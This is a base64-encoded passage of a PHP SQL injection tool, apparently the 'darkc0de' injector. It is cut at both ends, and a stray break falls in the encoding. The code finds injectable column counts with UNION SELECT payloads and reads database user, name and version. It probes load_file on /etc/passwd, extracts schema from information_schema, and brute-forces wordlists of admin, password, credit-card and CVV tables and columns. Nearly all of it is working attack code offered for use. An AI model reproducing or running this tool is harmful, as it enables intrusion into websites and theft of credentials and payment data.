CAgICRydXJsID0gJHVybDsKICAgIAogICAgZm9yKCRpID0gMDsgJGkgPD0gJG1heDsgJGkrKykgewogICAgJHdvcmQgLj0gImNvbmNhdCgweDY0NjE3MjZCNjMzMDY0NjUsMHgzYSwiLnN0cl9yZXBlYXQoJGksMSkuIiwweDNhKSwiOwogICAgJHNxbCA9IHN0cl9yZXBsYWNlKCJkYXJrYzBkZSIsICIxK0FORCsxPTIrVU5JT04rQUxMK1NFTEVDVCsiLnJ0cmltKCR3b3JkLCIsIikuIiskZW5kaW5nIiwgJHVybCk7CiAgICBpZihwcmVnX21hdGNoKCIvZGFya2MwZGU6KC4qPyk6L2kiLCBjb25faG9zdCgkc3FsKSwgJHZhbCkpIHsKICAgICAgICBwcmludCAiWy1dIEZvdW5kIGNvbHVtbiBudW1iZXI6ICIuJGkuIlxuIjsKICAgICAgICBwcmludCAiWy1dIE51bGwgTnVtYmVyOiAiLiR2YWxbMV0uIlxuIjsKICAgICAgICAkc2F2ZSA9IEBmaWxlX3B1dF9jb250ZW50cygnaW5qZWN0b3IudHh0JywgIlstXSBGb3VuZCBjb2x1bW4gbnVtYmVyOiAiLiRpLiJcclxuIixGSUxFX0FQUEVORCk7CiAgICAgICAgJHNhdmUgPSBAZmlsZV9wdXRfY29udGVudHMoJ2luamVjdG9yLnR4dCcsICJbLV0gTnVsbCBOdW1iZXI6ICIuJHZhbFsxXS4iXHJcbiIsRklMRV9BUFBFTkQpOwogICAgICAgIAogICAgICAgIGZvcigkYSA9IDA7ICRhIDw9ICRpOyAkYSsrKSB7CiAgICAgICAgJGNvbCAuPSAiJGEsIjsKICAgICAgICAgaWYoJGEgPT0gJHZhbFsxXSkgewogICAgICAgICAgICAgJGNvbCA9IHN0cl9yZXBsYWNlKCR2YWxbMV0sICJkYXJrYzBkZSIsICRjb2wpOwogICAgICAgICB9CiAgICAgICAgfQogICAgICAgICRyZWFsID0gc3RyX3JlcGxhY2UoImRhcmtjMGRlIiwgIjErQU5EKzE9MitVTklPTitBTEwrU0VMRUNUKyIucnRyaW0oJGNvbCwiLCIpLiIrJGVuZGluZyIsICRydXJsKTsKICAgICAgICBwcmludCAiWy1dIFVSTDogIi4kcmVhbC4iXG4iOwogICAgICAgICRzYXZlID0gQGZpbGVfcHV0X2NvbnRlbnRzKCdpbmplY3Rvci50eHQnLCAiWy1dIFVSTDogIi4kcmVhbC4iXHJcbiIsRklMRV9BUFBFTkQpOwogICAgICAgIHNxbF9pbmZvKCRyZWFsKTsKICAgIH0KICB9Cn0KCmZ1bmN0aW9uIHNxbF9pbmZvKCR1cmwpIHsKICAgIAogICAgJHRhYmxlXzQgPSBhcnJheSgKICAgICd0YmxhZG1pbnMnLCdzb3J0JywnX3dmc3Byb19hZG1pbicsJzRpbWFnZXNfdXNlcnMnLCdhX2FkbWluJywnYWNjb3VudCcsJ2FjY291bnRzJywnYWRtJywnYWRtaW4nLCdhZG1pbl9sb2dpbicsJ2FkbWluX3VzZXInLCdhZG1pbl91c2VyaW5mbycsJ2FkbWluaXN0ZXInLCdhZG1pbmlzdHJhYmxlJywnYWRtaW5pc3RyYXRlJywnYWRtaW5pc3RyYXRpb24nLCdhZG1pbmlzdHJhdG9yJywnYWRtaW5pc3RyYXRvcnMnLCdhZG1pbnJpZ2h0cycsJ2FkbWlucycsJ2FkbWludXNlcicsJ2FydCcsJ2FydGljbGVfYWRtaW4nLCdhcnRpY2xlcycsJ2FydGlrZWwnLCfDg8Ocw4LDqycsJ2F1dCcsJ2F1dGhvcicsJ2F1dG9yZScsJ2JhY2tlbmQnLCdiYWNrZW5kX3VzZXJzJywnYmFja2VuZHVzZXInLCdiYnMnLCdib29rJywnY2hhdF9jb25maWcnLCdjaGF0X21lc3NhZ2VzJywnY2hhdF91c2VycycsJ2NsaWVudCcsJ2NsaWVudHMnLCdjbHViY29uZmlnJywnY29tcGFueScsJ2NvbmZpZycsJ2NvbnRhY3QnLCdjb250YWN0cycsJ2NvbnRlbnQnLCdjb250cm9sJywnY3BnX2NvbmZpZycsJ2NwZzEzMl91c2VycycsJ2N1c3RvbWVyJywnY3VzdG9tZXJzJywnY3VzdG9tZXJzX2Jhc2tldCcsJ2RiYWRtaW5zJywnZGVhbGVyJywnZGVhbGVycycsJ2RpYXJ5JywnZG93bmxvYWQnLCdEcmFnb25fdXNlcnMnLCdlMTA3LmUxMDdfdXNlcicsJ2UxMDdfdXNlcicsJ2ZvcnVtLmliZl9tZW1iZXJzJywnZnVzaW9uX3VzZXJfZ3JvdXBzJywnZnVzaW9uX3VzZXJzJywnZ3JvdXAnLCdncm91cHMnLCdpYmZfYWRtaW5fc2Vzc2lvbnMnLCdpYmZfY29uZl9zZXR0aW5ncycsJ2liZl9tZW1iZXJzJywnaWJmX21lbWJlcnNfY29udmVyZ2UnLCdpYmZfc2Vzc2lvbnMnLCdpY3EnLCdpbWFnZXMnLCdpbmRleCcsJ2luZm8nLCdpcGIuaWJmX21lbWJlcnMnLCdpcGJfc2Vzc2lvbnMnLCdqb29tbGFfdXNlcnMnLCdqb3NfYmxhc3RjaGF0Y191c2VycycsJ2pvc19jb21wcm9maWxlcl9tZW1iZXJzJywnam9zX2NvbnRhY3RfZGV0YWlscycsJ2pvc19qb29tYmxvZ191c2VycycsJ2pvc19tZXNzYWdlc19jZmcnLCdqb3NfbW9zY2hhdF91c2VycycsJ2pvc191c2VycycsJ2tuZXdzX2xvc3RwYXNzJywna29yaXNuaWNpJywna3Byb19hZG1pbmxvZ3MnLCdrcHJvX3VzZXInLCdsaW5rcycsJ2xvZ2luJywnbG9naW5fYWRtaW4nLCdsb2dpbl9hZG1pbnMnLCdsb2dpbl91c2VyJywnbG9naW5fdXNlcnMnLCdsb2dpbnMnLCdsb2dvbicsJ2xvZ3MnLCdsb3N0X3Bhc3MnLCdsb3N0X3Bhc3N3b3JkcycsJ2xvc3RwYXNzJywnbG9zdHBhc3N3b3JkcycsJ21fYWRtaW4nLCdtYWluJywnbWFtYm9fc2Vzc2lvbicsJ21hbWJvX3VzZXJzJywnbWFuYWdlJywnbWFuYWdlcicsJ21iX3VzZXJzJywnbWVtYmVyJywnbWVtYmVybGlzdCcsJ21lbWJlcnMnLCdtaW5pYmJ0YWJsZV91c2VycycsJ21pdGdsaWVkZXInLCdtb3ZpZScsJ21vdmllcycsJ215YmJfdXNlcnMnLCdteXNxbCcsJ215c3FsLnVzZXInLCduYW1lJywnbmFtZXMnLCduZXdzJywnbmV3c19sb3N0cGFzcycsJ25ld3NsZXR0ZXInLCdudWtlX2F1dGhvcnMnLCdudWtlX2JiY29uZmlnJywnbnVrZV9jb25maWcnLCdudWtlX3BvcHNldHRpbmdzJywnbnVrZV91c2VycycsJ8OTw4PCu8KnJywnb2JiX3Byb2ZpbGVzJywnb3JkZXInLCdvcmRlcnMnLCdwYXJvbCcsJ3BhcnRuZXInLCdwYXJ0bmVycycsJ3Bhc3NlcycsJ3Bhc3N3b3JkJywncGFzc3dvcmRzJywncGVyZG9ydWVzJywncGVyZG9ydWVzaXQnLCdwaG9ydW1fc2Vzc2lvbicsJ3Bob3J1bV91c2VyJywncGhvcnVtX3VzZXJzJywncGhwYWRzX2NsaWVudHMnLCdwaHBhZHNfY29uZmlnJywncGhwYmJfdXNlcnMnLCdwaHBCQjIuZm9ydW1fdXNlcnMnLCdwaHBCQjIucGhwYmJfdXNlcnMnLCdwaHBteWFkbWluLnBtYV90YWJsZV9pbmZvJywncG1hX3RhYmxlX2luZm8nLCdwb2xsX3VzZXInLCdwdW5iYl91c2VycycsJ3B3ZCcsJ3B3ZHMnLCdyZWdfdXNlcicsJ3JlZ191c2VycycsJ3JlZ2lzdGVyZWQnLCdyZWd1c2VyJywncmVndXNlcnMnLCdzZXNzaW9uJywnc2Vzc2lvbnMnLCdzZXR0aW5ncycsJ3Nob3AuY2FyZHMnLCdzaG9wLm9yZGVycycsJ3NpdGVfbG9naW4nLCdzaXRlX2xvZ2lucycsJ3NpdGVsb2dpbicsJ3NpdGVsb2dpbnMnLCdzaXRlcycsJ3NtYWxsbnVrZV9tZW1iZXJzJywnc21mX21lbWJlcnMnLCdTU19vcmRlcnMnLCdzdGF0aXN0aWNzJywnc3VwZXJ1c2VyJywnc3lzYWRtaW4nLCdzeXNhZG1pbnMnLCdzeXN0ZW0nLCdzeXN1c2VyJywnc3lzdXNlcnMnLCd0YWJsZScsJ3RhYmxlcycsJ3RiX2FkbWluJywndGJfYWRtaW5pc3RyYXRvcicsJ3RiX2xvZ2luJywndGJfbWVtYmVyJywndGJfbWVtYmVycycsJ3RiX3VzZXInLCd0Yl91c2VybmFtZScsJ3RiX3VzZXJuYW1lcycsJ3RiX3VzZXJzJywndGJsJywndGJsX3VzZXInLCd0YmxfdXNlcnMnLCd0Ymx1c2VyJywndGJsX2NsaWVudHMnLCd0YmxfY2xpZW50JywndGJsY2xpZW50cycsJ3RibGNsaWVudCcsJ3Rlc3QnLCd1c2ViYl9tZW1iZXJzJywndXNlcicsJ3VzZXJfYWRtaW4nLCd1c2VyX2luZm8nLCd1c2VyX2xpc3QnLCd1c2VyX2xvZ2luJywndXNlcl9sb2dpbnMnLCd1c2VyX25hbWVzJywndXNlcmNvbnRyb2wnLCd1c2VyaW5mbycsJ3VzZXJsaXN0JywndXNlcmxvZ2lucycsJ3VzZXJuYW1lJywndXNlcm5hbWVzJywndXNlcnJpZ2h0cycsJ3VzZXJzJywndmJfdXNlcicsJ3ZidWxsZXRpbl9zZXNzaW9uJywndmJ1bGxldGluX3VzZXInLCd2b29kb29fbWVtYmVycycsJ3dlYmFkbWluJywnd2ViYWRtaW5zJywnd2VibWFzdGVyJywnd2VibWFzdGVycycsJ3dlYnVzZXInLCd3ZWJ1c2VycycsJ3hfYWRtaW4nLCd4YXJfcm9sZXMnLCd4b29wc19iYW5uZXJjbGllbnQnLCd4b29wc191c2VycycsJ3lhYmJfc2V0dGluZ3MnLCd5YWJic2Vfc2V0dGluZ3MnLCdBQ1RfSU5GTycsJ0FjdGl2ZURhdGFGZWVkJywnQ2F0ZWdvcnknLCdDYXRlZ29yeUdyb3VwJywnQ2hpY2tzUGFzcycsJ0NsaWNrVHJhY2snLCdDb3VudHJ5JywnQ291bnRyeUNvZGVzMScsJ0N1c3RvbU5hdicsJ0RhdGFGZWVkUGVyZm9ybWFuY2UxJywnRGF0YUZlZWRQZXJmb3JtYW5jZTInLCdEYXRhRmVlZFBlcmZvcm1hbmNlMl9pbmNvbWluZycsJ0RhdGFGZWVkU2hvd3RhZzEnLCdEYXRhRmVlZFNob3d0YWcyJywnRGF0YUZlZWRTaG93dGFnMl9pbmNvbWluZycsJ2R0cHJvcGVydGllcycsJ0V2ZW50JywnRXZlbnRfYmFja3VwJywnRXZlbnRfQ2F0ZWdvcnknLCdFdmVudFJlZGlyZWN0JywnRXZlbnRzX25ldycsJ0dlbnJlJywnSmFtUGFzcycsJ015VGlja2V0ZWsnLCdNeVRpY2tldGVrQXJjaGl2ZScsJ05ld3MnLCdQZXJmUGFzc3dvcmQnLCdQZXJmUGFzc3dvcmRBbGxTZWxlY3RlZCcsJ1Byb21vdGlvbicsJ1Byb3h5RGF0YUZlZWRQZXJmb3JtYW5jZScsJ1Byb3h5RGF0YUZlZWRTaG93dGFnJywnUHJveHlQcmljZUluZm8nLCdSZWdpb24nLCdTZWFyY2hPcHRpb25zJywnU2VyaWVzJywnU2hlbGRvbnNob3dzJywnU3RhdGVMaXN0JywnU3RhdGVzJywnU3ViQ2F0ZWdvcnknLCdTdWJqZWN0cycsJ1N1cnZleScsJ1N1cnZleUFuc3dlcicsJ1N1cnZleUFuc3dlck9wZW4nLCdTdXJ2ZXlRdWVzdGlvbicsJ1N1cnZleVJlc3BvbmRlbnQnLCdzeXNjb25zdHJhaW50cycsJ3N5c3NlZ21lbnRzJywndGJsUmVzdHJpY3RlZFBhc3N3b3JkcycsJ3RibFJlc3RyaWN0ZWRTaG93cycsJ1RpbWVEaWZmJywnVGl0bGVzJywnVG9QYWNtYWlsMScsJ1RvUGFjbWFpbDInLCdVc2VyUHJlZmVyZW5jZXMnLCd1dndfQ2F0ZWdvcnknLCd1dndfUHJlZicsJ3V2d19QcmVmZXJlbmNlcycsJ1ZlbnVlJywndmVudWVzJywnVmVudWVzTmV3JywnWF8zOTQ1JywndGJsQXJ0aXN0Q2F0ZWdvcnknLCd0YmxBcnRpc3RzJywndGJsQ29uZmlncycsJ3RibExheW91dHMnLCd0YmxMb2dCb29rQXV0aG9yJywndGJsTG9nQm9va0VudHJ5JywndGJsTG9nQm9va0ltYWdlcycsJ3RibExvZ0Jvb2tJbXBvcnQnLCd0YmxMb2dCb29rVXNlcicsJ3RibE1haWxzJywndGJsTmV3Q2F0ZWdvcnknLCd0YmxOZXdzJywndGJsT3JkZXJzJywndGJsU3RvbmVDYXRlZ29yeScsJ3RibFN0b25lcycsJ3RibFVzZXInLCd0YmxXaXNoTGlzdCcsJ1ZJRVcxJywndmlld0xvZ0Jvb2tFbnRyeScsJ3ZpZXdTdG9uZUFydGlzdCcsJ3Z3TGlzdEFsbEF2YWlsYWJsZScsJ0NDX2luZm8nLCdDQ191c2VybmFtZScsJ2Ntc191c2VyJywnY21zX3VzZXJzJywnY21zX2FkbWluJywnY21zX2FkbWlucycsJ3VzZXJfbmFtZScsJ2pvc191c2VyJywndGFibGVfdXNlcicsJ2VtYWlsJywnbWFpbCcsJ2J1bGxldGluJywnY2NfaW5mbycsJ2xvZ2luX25hbWUnLCdhZG11c2VyaW5mbycsJ3VzZXJsaXN0dXNlcl9saXN0JywnU2l0ZUxvZ2luJywnU2l0ZV9Mb2dpbicsJ1VzZXJBZG1pbicsJ0FkbWlucycsJ0xvZ2luJywnTG9naW5zJwogICAgKTsKICAgIAogICAgJGNvbHVtbl80ID0gYXJyYXkoCid1c2VyJywndXNlcm5hbWUnLCdwYXNzd29yZCcsJ3Bhc3N3ZCcsJ3Bhc3MnLCdjY19udW1iZXInLCdpZCcsJ2VtYWlsJywnZW1yaScsJ2ZqYWxla2FsaW1pJywncHdkJywndXNlcl9uYW1lJywnY3VzdG9tZXJzX2VtYWlsX2FkZHJlc3MnLCdjdXN0b21lcnNfcGFzc3dvcmQnLCd1c2VyX3Bhc3N3b3JkJywnbmFtZScsJ3VzZXJfcGFzcycsJ2FkbWluX3VzZXInLCdhZG1pbl9wYXNzd29yZCcsJ2FkbWluX3Bhc3MnLCd1c2VybicsJ3VzZXJfbicsJ3VzZXJzJywnbG9naW4nLCdsb2dpbnMnLCdsb2dpbl91c2VyJywnbG9naW5fYWRtaW4nLCdsb2dpbl91c2VybmFtZScsJ3VzZXJfdXNlcm5hbWUnLCd1c2VyX2xvZ2luJywnYXVpZCcsJ2Fwd2QnLCdhZG1pbmlkJywnYWRtaW5faWQnLCdhZG1pbnVzZXInLCdhZG1pbnVzZXJpZCcsJ2FkbWluX3VzZXJpZCcsJ2FkbWludXNlcm5hbWUnLCdhZG1pbl91c2VybmFtZScsJ2FkbWlubmFtZScsJ2FkbWluX25hbWUnLCd1c3InLCd1c3JfbicsJ3Vzcm5hbWUnLCd1c3JfbmFtZScsJ3VzcnBhc3MnLCd1c3JfcGFzcycsJ3Vzcm5hbScsJ25jJywndWlkJywndXNlcmlkJywndXNlcl9pZCcsJ215dXNlcm5hbWUnLCdtYWlsJywnZW1uaScsJ2xvZ29odScsJ3B1bm9uamVzJywna3Byb191c2VyJywnd3BfdXNlcnMnLCdlbW5pcGxvdGUnLCdwZXJkb3J1ZXNpJywncGVyZG9yaW1pJywncHVuZXRvcmV0JywnbG9naW5pJywnbGxvZ2FyaWEnLCdmamFsZWthbGltaW4nLCdrb2RpJywnZW1lcicsJ2ltZScsJ2tvcmlzbmlrJywna29yaXNuaWNpJywndXNlcjEnLCdhZG1pbmlzdHJhdG9yJywnYWRtaW5pc3RyYXRvcl9uYW1lJywnbWVtX2xvZ2luJywnbG9naW5fcGFzc3dvcmQnLCdsb2dpbl9wYXNzJywnbG9naW5fcGFzc3dkJywnbG9naW5fcHdkJywnc2lmcmEnLCdsb3ppbmthJywncHN3JywncGFzczF3b3JkJywncGFzc193b3JkJywncGFzc3cnLCdwYXNzX3cnLCd1c2VyX3Bhc3N3ZCcsJ3VzZXJwYXNzJywndXNlcnBhc3N3b3JkJywndXNlcnB3ZCcsJ3VzZXJfcHdkJywndXNlcmFkbWluJywndXNlcl9hZG1pbicsJ215cGFzc3dvcmQnLCdwYXNzd3JkJywnYWRtaW5fcHdkJywnYWRtaW5fcGFzc3dkJywnbWVtX3Bhc3N3b3JkJywnbWVtbG9naW4nLCdlX21haWwnLCd1c3JuJywndV9uYW1lJywndW5hbWUnLCdtZW1wYXNzd29yZCcsJ21lbV9wYXNzJywnbWVtX3Bhc3N3ZCcsJ21lbV9wd2QnLCdwX3dvcmQnLCdwd29yZCcsJ3BfYXNzd29yZCcsJ215bmFtZScsJ215X3VzZXJuYW1lJywnbXlfbmFtZScsJ215X3Bhc3N3b3JkJywnbXlfZW1haWwnLCdjdnZudW1iZXInLCdhYm91dCcsJ2FjY2VzcycsJ2FjY250JywnYWNjbnRzJywnYWNjb3VudCcsJ2FjY291bnRzJywnYWRtaW4nLCdhZG1pbmVtYWlsJywnYWRtaW5sb2dpbicsJ2FkbWlubWFpbCcsJ2FkbWlucycsJ2FpZCcsJ2FpbScsJ2F1dGgnLCdhdXRoZW50aWNhdGUnLCdhdXRoZW50aWNhdGlvbicsJ2Jsb2cnLCdjY19leHBpcmVzJywnY2Nfb3duZXInLCdjY190eXBlJywnY2ZnJywnY2lkJywnY2xpZW50bmFtZScsJ2NsaWVudHBhc3N3b3JkJywnY2xpZW50dXNlcm5hbWUnLCdjb25mJywnY29uZmlnJywnY29udGFjdCcsJ2NvbnZlcmdlX3Bhc3NfaGFzaCcsJ2NvbnZlcmdlX3Bhc3Nfc2FsdCcsJ2NyYWNrJywnY3VzdG9tZXInLCdjdXN0b21lcnMnLCdjdnZudW1iZXJdJywnZGF0YScsJ2RiX2RhdGFiYXNlX25hbWUnLCdkYl9ob3N0bmFtZScsJ2RiX3Bhc3N3b3JkJywnZGJfdXNlcm5hbWUnLCdkb3dubG9hZCcsJ2UtbWFpbCcsJ2VtYWlsYWRkcmVzcycsJ2Z1bGwnLCdnaWQnLCdncm91cCcsJ2dyb3VwX25hbWUnLCdoYXNoJywnaGFzaHNhbHQnLCdob21lcGFnZScsJ2ljcScsJ2ljcV9udW1iZXInLCdpZF9ncm91cCcsJ2lkX21lbWJlcicsJ2ltYWdlcycsJ2luZGV4JywnaXBfYWRkcmVzcycsJ2xhc3RfaXAnLCdsYXN0X2xvZ2luJywnbGFzdG5hbWUnLCdsb2cnLCdsb2dpbl9uYW1lJywnbG9naW5fcHcnLCdsb2dpbmtleScsJ2xvZ2lub3V0JywnbG9nbycsJ21kNWhhc2gnLCdtZW1iZXInLCdtZW1iZXJfaWQnLCdtZW1iZXJfbG9naW5fa2V5JywnbWVtYmVyX25hbWUnLCdtZW1iZXJpZCcsJ21lbWJlcm5hbWUnLCdtZW1iZXJzJywnbmV3JywnbmV3cycsJ25pY2snLCdudW1iZXInLCdudW1tZXInLCdwYXNzX2hhc2gnLCdwYXNzd29yZHNhbHQnLCdwYXNzd29ydCcsJ3BlcnNvbmFsX2tleScsJ3Bob25lJywncHJpdmFjeScsJ3B3JywncHdyZCcsJ3NhbHQnLCdzZWFyY2gnLCdzZWNyZXRhbnN3ZXInLCdzZWNyZXRxdWVzdGlvbicsJ3NlcmlhbCcsJ3Nlc3Npb25fbWVtYmVyX2lkJywnc2Vzc2lvbl9tZW1iZXJfbG9naW5fa2V5Jywnc2Vzc2tleScsJ3NldHRpbmcnLCdzaWQnLCdzcGFjZXInLCdzdGF0dXMnLCdzdG9yZScsJ3N0b3JlMScsJ3N0b3JlMicsJ3N0b3JlMycsJ3N0b3JlNCcsJ3RhYmxlX3ByZWZpeCcsJ3RlbXBfcGFzcycsJ3RlbXBfcGFzc3dvcmQnLCd0ZW1wcGFzcycsJ3RlbXBwYXN3b3JkJywndGV4dCcsJ3VuJywndXNlcl9lbWFpbCcsJ3VzZXJfaWNxJywndXNlcl9pcCcsJ3VzZXJfbGV2ZWwnLCd1c2VyX3Bhc3N3JywndXNlcl9wdycsJ3VzZXJfcHdvcmQnLCd1c2VyX3B3cmQnLCd1c2VyX3VuJywndXNlcl91bmFtZScsJ3VzZXJfdXNlcm5tJywndXNlcl91c2VybnVuJywndXNlcl91c3JubScsJ3VzZXJpcCcsJ3VzZXJsb2dpbicsJ3VzZXJubScsJ3VzZXJwdycsJ3VzcjInLCd1c3JubScsJ3VzcnMnLCd3YXJleicsJ3hhcl9uYW1lJywneGFyX3Bhc3MnCik7CiAgICAKICAgIHByaW50ICJbLV0gR2V0dGluZyBzcWwgc2VydmVyIGluZm9ybWF0aW9uLi4uXG4iOwogICAgJGluZm8gPSBhcnJheSgKICAgICdVc2VyJyA9PiAndXNlcigpJywKICAgICdEYXRhYmFzZScgPT4gJ2RhdGFiYXNlKCknLAogICAgJ1ZlcnNpb24nID0

+ICd2ZXJzaW9uKCknCiAgICApOwogICAgJHJ1cmwgPSAkdXJsOwogICAgCiAgICAkZW5kaW5nID0gJy0tJzsKICAgIAogICAgZm9yZWFjaCgkaW5mbyBhcyAkZ2V0ID0+ICR2YWwpIHsKICAgICAgICBpZihwcmVnX21hdGNoKCIvZGFya2MwZGU6KC4qPyk6ZGFya2MwZGUvIiwgY29uX2hvc3QoIiIuc3RyX3JlcGxhY2UoImRhcmtjMGRlIiwgIiIuJHN0cmluZy4iK2NvbmNhdCgweDY0NjE3MjZCNjMzMDY0NjUsMHgzYSwkdmFsLDB4M2EsMHg2NDYxNzI2QjYzMzA2NDY1KSsiLCAkdXJsKS4iIiksICR2YWx1ZSkpIHsKICAgICAgICAgICAgcHJpbnQgIlstXSAkZ2V0OiAkdmFsdWVbMV1cbiI7CiAgICAgICAgICAgICRzYXZlID0gQGZpbGVfcHV0X2NvbnRlbnRzKCdpbmplY3Rvci50eHQnLCAiWy1dICRnZXQ6ICR2YWx1ZVsxXVxyXG4iLEZJTEVfQVBQRU5EKTsKICAgICAgICB9fQogICAgICAgIHByaW50ICJbLV0gVGVzdGluZyBsb2FkIGZpbGUuLi5cbiI7CiAgICAkbG9hZCA9IHN0cl9yZXBsYWNlKCJkYXJrYzBkZSIsICIiLiRzdHJpbmcuImxvYWRfZmlsZSgweDJmNjU3NDYzMmY3MDYxNzM3Mzc3NjQpIiwgJHJ1cmwpOwogICAgaWYocHJlZ19tYXRjaCgiL3Jvb3Q6eDovIiwgY29uX2hvc3QoJGxvYWQpKSkgewogICAgICAgIHByaW50ICJbLV0gdzAwdCB3MDB0LCB5b3UgaGF2ZSBwZXJtaXNzaW9uIHRvIGxvYWQgZmlsZSFcbiI7CiAgICAgICAgcHJpbnQgIlstXSBVUkw6ICRsb2FkXG4iOwogICAgICAgICRzYXZlID0gQGZpbGVfcHV0X2NvbnRlbnRzKCdpbmplY3Rvci50eHQnLCAiWy1dIHcwMHQgdzAwdCwgeW91IGhhdmUgcGVybWlzc2lvbiB0byBsb2FkIGZpbGUhXHJcbiIsRklMRV9BUFBFTkQpOwogICAgICAgICRzYXZlID0gQGZpbGVfcHV0X2NvbnRlbnRzKCdpbmplY3Rvci50eHQnLCAiWy1dIFVSTDogJGxvYWRcclxuIixGSUxFX0FQUEVORCk7CiAgICB9IGVsc2UgewogICAgICAgIHByaW50ICJbLV0gTm8gcGVybWlzc2lvbiB0byBsb2FkIGZpbGUgOiggXG4iOwogICAgfQogICAgICAgICAgICBpZihwcmVnX21hdGNoKCIvZGFya2MwZGU6NS4oLio/KTpkYXJrYzBkZS8iLCBjb25faG9zdCgiIi5zdHJfcmVwbGFjZSgiZGFya2MwZGUiLCAiY29uY2F0KDB4NjQ2MTcyNkI2MzMwNjQ2NSwweDNhLHZlcnNpb24oKSwweDNhLDB4NjQ2MTcyNkI2MzMwNjQ2NSkiLCAkdXJsKS4iIiksICR2YWx1ZSkpIHsKICAgICAgICAgICAgICAgIHByaW50ICJbLV0gTXlTUUwgU2VydmVyIHZlcnNpb24gaXMgOiA1LnhcbiI7CiAgICAgICAgICAgICAgICBwcmludCAiWy1dIFN0YXJ0IGV4dHJhY3QgdGhlIGNvbHVtbiBhbmQgdGFibGUuLi5cbiI7CiAgICAgICAgICAgICAgICBwcmludCAiWy1dIFRhYmxlIDogQ29sdW1uXG4iOwogICAgICAgICAgICAgICAgJHVybCA9IHN0cl9yZXBsYWNlKCJkYXJrYzBkZSIsICJncm91cF9jb25jYXQoY2hhcigxMTQsNDgsMTIwLDU4KSx0YWJsZV9uYW1lLGNoYXIoNTgsMTE0LDQ4LDEyMCkpIiwgJHVybCk7CiAgICAgICAgICAgICAgICAkdXJsID0gc3RyX3JlcGxhY2UoJGVuZGluZywgIitmcm9tK2luZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMrd2hlcmUrdGFibGVfc2NoZW1hPWRhdGFiYXNlKCkrJGVuZGluZyIsICR1cmwpOwogICAgICAgICAgICAgICAgaWYocHJlZ19tYXRjaF9hbGwoIi9yMHg6KC4qPyk6cjB4LyIsIGNvbl9ob3N0KCR1cmwpLCAkdGFibGVzKSkgewogICAgICAgICAgICAgICAgICAgIGZvcmVhY2goJHRhYmxlc1sxXSBhcyAkdGFibGUpIHsKICAgICAgICAgICAgICAgICAgICAkaSsrOwogICAgICAgICAgICAgICAgICAgICR1cmwgPSBzdHJfcmVwbGFjZSgiZGFya2MwZGUiLCAiZ3JvdXBfY29uY2F0KGNoYXIoMTE0LDQ4LDEyMCw1OCksY29sdW1uX25hbWUsY2hhcig1OCwxMTQsNDgsMTIwKSkiLCAkcnVybCk7CiAgICAgICAgICAgICAgICAgICAgJHVybCA9IHN0cl9yZXBsYWNlKCRlbmRpbmcsICIrZnJvbStpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyt3aGVyZSt0YWJsZV9uYW1lPTB4Ii5IZXhWYWx1ZSgkdGFibGUpLiIrJGVuZGluZyIsICR1cmwpOwogICAgICAgICAgICAgICAgICAgIGlmKHByZWdfbWF0Y2hfYWxsKCIvcjB4OiguKj8pOnIweC8iLCBjb25faG9zdCgkdXJsKSwgJGNvbHVtbnMpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICJbJGldICgkdGFibGUpIDogIjsKICAgICAgICAgICAgICAgICAgICAgICAgJHNhdmUgPSBAZmlsZV9wdXRfY29udGVudHMoJ2luamVjdG9yLnR4dCcsICJbJGldICgkdGFibGUpIDogIixGSUxFX0FQUEVORCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGZvcmVhY2goJGNvbHVtbnNbMV0gYXMgJGNvbHVtbikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgIiRjb2x1bW4sICI7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc2F2ZSA9IEBmaWxlX3B1dF9jb250ZW50cygnaW5qZWN0b3IudHh0JywgIiRjb2x1bW4sICIsRklMRV9BUFBFTkQpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICRzYXZlID0gQGZpbGVfcHV0X2NvbnRlbnRzKCdpbmplY3Rvci50eHQnLCAiXHJcbiIsRklMRV9BUFBFTkQpOwogICAgICAgICAgICAgICAgICAgICAgICBwcmludCAiXG5cbiI7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBwcmludCAiWy1dIE15U1FMIFNlcnZlciB2ZXJzaW9uIGlzIDogNC54XG4iOwogICAgICAgICAgICAgICAgcHJpbnQgIlstXSBTdGFydCBhdXRvbWF0aWMgY29sdW1uIGFuZCB0YWJsZSBmaW5kZXIuLi5cbiI7CiAgICAgICAgICAgICAgICBwcmludCAiWy1dIFRoaXMgbWF5IHRha2UgYSBmZXcgbWludXRlcyBvciBob3VycyB0byBmaW5pc2hcbiI7CiAgICAgICAgICAgICAgICBmb3JlYWNoKCR0YWJsZV80IGFzICR0YWJsZSkgewogICAgICAgICAgICAgICAgICAgICRpKys7CiAgICAgICAgICAgICAgICAgICAgJHVybCA9IHN0cl9yZXBsYWNlKCJjb25jYXQoMHg2OTZFNkEzMzYzNzQpIiwgImNvbmNhdCgweDY0NjE3MjZCNjMzMDY0NjUpIiwgJHJ1cmwpOwogICAgICAgICAgICAgICAgICAgICR1cmwgPSBzdHJfcmVwbGFjZSgkZW5kaW5nLCAiK2Zyb20rIi4kdGFibGUuIiskZW5kaW5nIiwgJHVybCk7CiAgICAgICAgICAgICAgICAgICAgaWYocHJlZ19tYXRjaCgiL2RhcmtjMGRlLyIsIGNvbl9ob3N0KCR1cmwpKSkgewogICAgICAgICAgICAgICAgICAgICAgICBwcmludCAiWyRpXSBGb3VuZCBUYWJsZSA6ICR0YWJsZVxuIjsKICAgICAgICAgICAgICAgICAgICAgICAgc2F2ZV9sb2coJ2luamVjdG9yLnR4dCcsICJbLV0gRm91bmQgVGFibGUgOiAkdGFibGVcclxuIik7CiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICJbLV0gRmluZGluZyBjb2x1bW4uLi5cbiI7CiAgICAgICAgICAgICAgICAgICAgICAgICBmb3JlYWNoKCRjb2x1bW5fNCBhcyAkY29sdW1uKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHVybCA9IHN0cl9yZXBsYWNlKCJkYXJrYzBkZSIsICJjb25jYXQoMHg2NDYxNzI2QjYzMzA2NDY1LDB4M2EsJGNvbHVtbiwweDNhLDB4NjQ2MTcyNkI2M